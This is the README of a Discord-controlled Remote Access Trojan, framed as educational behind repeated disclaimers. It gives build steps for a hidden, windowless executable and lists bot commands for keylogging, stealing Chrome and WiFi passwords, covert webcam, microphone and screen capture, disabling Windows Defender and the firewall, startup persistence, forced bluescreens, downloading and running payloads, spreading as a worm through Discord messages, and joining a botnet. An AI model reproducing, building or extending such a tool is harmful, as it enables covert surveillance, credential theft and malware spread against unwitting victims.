![AI-Assisted](https://img.shields.io/badge/AI-Assisted-blueviolet)  
### 🐀 Discord RAT (Educational Use Only)  
**DISCLAIMER**: This tool is for **ethical hacking research, penetration testing, and educational purposes ONLY**. Unauthorised use against Discord's Terms of Service or for malicious activities is **strictly prohibited**.  





### 📜 Usage Guidelines  
- 🔒 **Legal Compliance**: Only use on systems you own or have explicit permission to test.  
- 🚫 **No Malicious Activity**: Do **not** deploy this for illegal purposes (spying, harassment, etc.).  
- ⚖️ **Liability**: The developer is **not responsible** for misuse.  

### ⚠️ Warning  
- Using this tool maliciously violates **Discord's TOS** and may result in **account termination** or **legal action**.
- 🚫 Strictly prohibited: Modifying this code to add backdoors, malware, or unauthorised features.
- 💰 Forbidden: Reselling, repackaging, or commercially distributing modified versions.
- 🔐 This is the only official source for this code - any other versions are unauthorised.
- ⚖️ Legal action will be pursued against violators of these terms.

### ℹ️ Info
- This tool is a Discord-based Remote Access Trojan (RAT) designed for educational purposes only.
- Commands are executed through a private Discord bot using your bot token.
- You must have admin control over the bot and explicit permission to test on any system.

### 🔑 Requirements
- A Discord bot token.
- Admin privileges for the bot (if required).
- Ethical approval to test on target systems.
- Latest Python version

### 🚨 Legal Disclaimer  
- By using this software, you agree that the developer is not liable for any misuse. You assume all legal responsibility.

### 🛠️ Building
- **Copy the command in Requirements.txt to install the necessary libraries**
- Run vs_BuildTools.exe and select "Desktop development with C++"
- Run OPUSFIX.py
- python setup.py build_ext --inplace
- pyinstaller --noconfirm --onefile --noconsole --icon=NONE --collect-all certifi --hidden-import aiohttp --hidden-import certifi --hidden-import ssl launcher.py


### 🔧 Usage
- **Add your Discord token and webhooks**
- !sysinfo - displays system information
- !processes - displays live processes
- !kill [pid] - kills pid given
- !disk - shows disk usage
- !network - shows network information
- !filedropper - When a file is dropped in Discord, it is saved and executed on the victim's machine
- !start - given a destination, it starts the direct file
- !startup - adds itself to HKCU startup, so only applies to the current user
- !hklmstartup - adds itself to all users' startup
- !connect [url] - executes exe in temp then removes it, used for files that don't need live connection eg. password grabber
- !display_startup - Displays reg entries in startup for HKLM and HKCU
- !runadmin - run uac prompt 100 times until yes is pressed or computer is turned off
- !protection_on - enables firewall and defender
- !protection_off - Disables firewall and defender
- !startadmin - adds itself to services so it can start up as admin without UAC prompt
- !disable_taskmgr - disables task manager in reg
- !enable_taskmgr - Enables task manager in reg
- !crit - makes itself a critical process, so ending it will cause a BSOD
- !uncrit - reversts itself back to an ordinary process
- !block - blocks the user's mouse and keyboard
- !unblock unblocks the users' mouse and keyboard
- !screenshot - Takes screenshots every 5 secs
- !stopscreenshot` - Stops taking screenshots
- !startscreenrec - records screen in 5 sec intervals
- !stopscreenrec - stops recording screen
- !webcam - captures webcam image
- !startwebcamrec - records webcam in 5 sec intervals
- !stopwebcamrec - stops recording webcam
- !audio - records mic audio every 5 secs
- !audiostop - Stop recording audio
- !outputaudio - Records output audio; devices need to be set first
- !outputaudiostop - Stops recording output audio
- !rdp [ip] [port] - run server.py in SPY and displays screen on ip and port
- !stoprdp - stops displaying users' screens
- !listdevices - list audio devices (use this before setting the output/input devices)
- !defaultdevices - List default audio devices
- !setinputdevice - Set input audio device (if you don't know which one is correct, ask AI)
- !setoutputdevice - Set output audio device (if you don't know which one is correct, ask AI)
- !listenlive - bot joins call and you can listen to direct mic audio
- !stoplistenlive - stops recording mic audio
- !listenliveoutput - bot joins call and you can listen to the direct speaker audio
- !listenliveoutputstop - stops recording speaker audio
- !resetlive - resets all devices so the audio stays as clear as possible
- !cmd [command] - Execute command
- !ps [command] - Execute PowerShell command
- !download [file] - Downloads file from user
- !upload [url] [dest] - Downloads from URL and saves where you want
- !run [app] - runs file from destination (same as start)
- !lock - Locks the user's computer
- !shutdown - shuts down the computer
- !bluescreen - causes a bluescreen for the user's computer
- !chrome_passwords - gets Chrome's saved passwords
- !wifi_passwords - Gets WiFi passwords
- !keylog_start - Start keylogger
- !keylog_stop - Stop keylogger
- !keylog_show - Show keylog
- !clipboard - Get clipboard content
- !ls [dir] - List directory
- !cd [dir] - Change directory
- !pwd - Show current directory
- !rm [path] - Delete file/directory
- !mkdir [name] - Create directory
- !search [name] - Search files
- !ip - Show IP addresses
- !portscan [ip] [port] - Scan port
- !ping [host] - Ping host
- !whois [domain] - WHOIS lookup
- !ifconfig - Network config
- !worm [url] [Token] - spreads through Discord DM (use a bat file to send as a downloader)
- !inject [url] - downloads file and saves to %LocalAppData%\Programs\apps and executes (used for live connection files like backdoors)
- !botnet - connects to botnet (add link to botnet)
- !removebotnet - disconnects botnet
- !msg [text] - Show message box
- !notify [title] [msg] - Send notification
- !type [text] - Type text
- !hotkeys [keys] - Press hotkeys
- !grabinfo - Gets system info, etc
- !exclude [path] - Add folder to Windows Defender exclusions
- !wallpaper - Change wallpaper for the victim
- !vmdetect - detects if file is being run on VM
- !SELFDESTRUCT - Self-destructs
- !exit - exits bot

  
